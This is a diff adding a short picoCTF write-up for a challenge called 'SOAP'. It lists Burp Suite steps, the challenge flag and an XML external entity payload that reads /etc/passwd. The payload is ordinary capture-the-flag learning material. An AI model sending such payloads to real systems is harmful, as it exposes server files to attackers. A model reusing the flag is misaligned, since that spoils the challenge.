@@ -49,3 +49,44 @@ Other incorrect methods you tried:
 - Tried directly accessing the file in the source
 - Tried finding the file somewhere within the books
 
+
+# SOAP
+
+**Flag:** picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
+
+How you approached the challenge:
+
+- step 1
+    Opened the website on burpsuite
+
+- step 2
+    sent the request to the repeater 
+
+- ste 3:
+    Tried different payload commands to see if it worked
+
+- step 4: 
+    modifed the data with 
+    ```<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    <stockCheck><productId>&xxe;</productId></stockCheck>```
+
+- Step 5:
+    received the flag in the response
+
+
+What you learned through solving this challenge:
+
+1. XXE 
+2. Modifying the script through burpsuite
+
+Other incorrect methods you tried:
+
+- tried changing the request path to /etc/passwd
+- response wasn't received for most attempts until I switched from wifi to mobile network
+
+References
+
+- [xxe](https://portswigger.net/web-security/xxe)
+- [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
+
